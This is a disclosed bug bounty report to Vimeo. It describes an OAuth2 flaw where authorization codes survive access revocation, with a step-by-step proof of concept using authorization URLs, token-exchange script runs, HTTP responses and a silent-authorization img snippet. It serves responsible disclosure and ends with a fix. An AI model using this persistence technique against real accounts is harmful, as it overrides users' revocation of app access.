@@ -1,0 +1,156 @@
+ReportLink:https://hackerone.com/reports/57603
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/dor1s
+ReportedTo:Vimeo(vimeo)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:31.05.2015 17:40:09
+
+Summary:
+
+OAuth2 API makes it possible for users to grant access to their accounts to some third-side applications. Of course, users are able to manage such applications' access to their accounts and may deny access for any application. When some user denies access for the application, all `access_token`s are being revoked and become invalid. But not only `access_token`s should be revoked, authorization `code`s (it is intermediate token used in OAuth2 Authorization Flow) must be revoked too. Vimeo OAuth2 API implementation does not revoke authorization `code` during access revocation. It may be exploited to restore access to user's account by malicious application after access revocation.
+
+Proof of Concept
+==============
+*(all scripts used are attached)*
+
+1) Open the link for OAuth2 authorization for some application. Example link for my test application (**Dor1s Test1**, feel free to use my test application to reproduce the issue):
+```
+https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef
+```
+2) Log into your Vimeo account (if needed) and click **Allow**
+3) Copy `code` value from callback url, for example:
+```
+https://avuln.com/callback?state=0123456789abcdef&code=e1fa87cd449ae55b74445b31ac79450c14eeb657
+```
+`code` value is `e1fa87cd449ae55b74445b31ac79450c14eeb657`
+4) Use `code` value to obtain `access_token`:
+```
+doris$ ./getAccessToken.sh e1fa87cd449ae55b74445b31ac79450c14eeb657
+{
+    "access_token": "d3ac3bb53d1c4ebc3de7d28e4ed801c0",
+    "token_type": "bearer",
+    "scope": "public private",
+    "user": {
+        "uri": "/users/39285903",
+<... CUT OUT ... >
+}
+```
+5) Check validity of `access_token`:
+```
+doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0
+HTTP/1.1 200 OK
+Date: Tue, 21 Apr 2015 14:10:29 GMT
+Server: nginx
+Content-Type: application/vnd.vimeo.user+json
+Cache-Control: no-cache, max-age=315360000
+Expires: Fri, 18 Apr 2025 14:10:29 GMT
+Content-Length: 2930
+Accept-Ranges: bytes
+Via: 1.1 varnish
+Age: 0
+X-Served-By: cache-fra1239-FRA
+X-Cache: MISS
+X-Cache-Hits: 0
+X-Timer: S1429625429.334602,VS0,VE203
+Vary: Accept,Vimeo-Client-Id,Accept-Encoding
+
+{
+    "uri": "/users/39285903",
+< ... CUT OUT ... >
+}
+```
+6) Repeat step 1. Link for my test application:
+```
+https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef
+```
+7) Repeat step 2. Log into your accounts (if needed) and click **Allow**.
+*Note:* it is not hard to imagine an application requiring user to pass authentication one more time. Many applications do not store long-term sessions and force users to login/authorize every day or even often.
+
+*Note 2:* often OAuth providers allow to use `approval_prompt=auto` parameter, which makes this step does not require user to click **Allow** again. I had not found such possibility for Vimeo API, but if it is possible, in such case malicious application just need to place on its web-site (or whenever in the Internet) something like that:
+```
+<html>
+	<img src="https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef">
+</html>
+```
+
+such code will "silently" produce new `access_token` value to callback each time it has been loaded by the user.
+
+8) Copy `code` value from callback url and save it for future usage:
+```
+https://avuln.com/callback?state=0123456789abcdef&code=82e24f835184f47cd83f249907e7bd5018bf62c9
+```
+`code` value is `82e24f835184f47cd83f249907e7bd5018bf62c9`
+
+9) Go to account security settings [https://vimeo.com/settings/apps](https://vimeo.com/settings/apps)
+
+10) **Disconnect** the application (**Dor1s Test1** if my test application used) from **Apps** section
+
+11) To ensure that access is denied, repeat step 5:
+```
+doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0
+HTTP/1.1 401 Authorization Required
+Date: Tue, 21 Apr 2015 14:23:55 GMT
+Server: nginx
+Content-Type: application/vnd.vimeo.error+json
+Cache-Control: no-cache, max-age=315360000
+WWW-Authenticate: Bearer error="invalid_token"
+Expires: Fri, 18 Apr 2025 14:23:55 GMT
+Content-Length: 53
+Accept-Ranges: bytes
+Via: 1.1 varnish
+X-Served-By: cache-fra1245-FRA
+X-Cache: MISS
+X-Cache-Hits: 0
+X-Timer: S1429626235.146346,VS0,VE105
+Vary: Accept,Vimeo-Client-Id,Accept-Encoding
+
+{
+    "error": "A valid user token must be passed."
+}
+```
+12) Use `code` value from step 8 and exchange it for `access_token`:
+```
+doris$ ./getAccessToken.sh 82e24f835184f47cd83f249907e7bd5018bf62c9
+{
+    "access_token": "9eabdc746910ea39c07395ee1b69a2b9",
+    "token_type": "bearer",
+    "scope": "public private",
+    "user": {
+        "uri": "/users/39285903",
+<... CUT OUT ...>
+}
+```
+13) Check validity of `access_token`:
+```
+doris$ ./me.sh 9eabdc746910ea39c07395ee1b69a2b9
+HTTP/1.1 200 OK
+Date: Tue, 21 Apr 2015 14:25:41 GMT
+Server: nginx
+Content-Type: application/vnd.vimeo.user+json
+Cache-Control: no-cache, max-age=315360000
+Expires: Fri, 18 Apr 2025 14:25:41 GMT
+Content-Length: 2930
+Accept-Ranges: bytes
+Via: 1.1 varnish
+Age: 0
+X-Served-By: cache-fra1235-FRA
+X-Cache: MISS
+X-Cache-Hits: 0
+X-Timer: S1429626341.087757,VS0,VE201
+Vary: Accept,Vimeo-Client-Id,Accept-Encoding
+
+{
+    "uri": "/users/39285903",
+<... CUT OUT ...>
+}
+```
+
+Impact
+======
+The vulnerability allows an malicious application to keep its access active to a victim's account even after access revocation. This is not only authorization bypass, but it also deprives a victim ability to manage access for an application.
+
+Mitigation
+========
+For access revocation processing all authorization `code` issued for certain pair of user and application should be invalidated (as it currently being done for `access_token` values).
